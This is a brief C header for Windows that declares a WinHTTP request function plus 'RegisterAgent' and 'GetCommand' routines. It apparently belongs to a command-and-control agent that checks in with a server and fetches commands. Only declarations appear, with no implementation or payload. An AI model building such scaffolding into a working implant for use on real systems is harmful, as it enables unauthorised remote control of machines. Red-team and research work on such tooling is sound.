#pragma once
#include <Windows.h>
#include <winhttp.h>
#include <stdio.h>

HANDLE PerformRequest(LPCWSTR UserAgent, LPCWSTR HttpEndpoint, LPCWSTR pswzServerName, LPCWSTR DataBuff, DWORD dwDataLen, LPCWSTR pswzRequestHeaders);
BOOL RegisterAgent();
BOOL GetCommand();
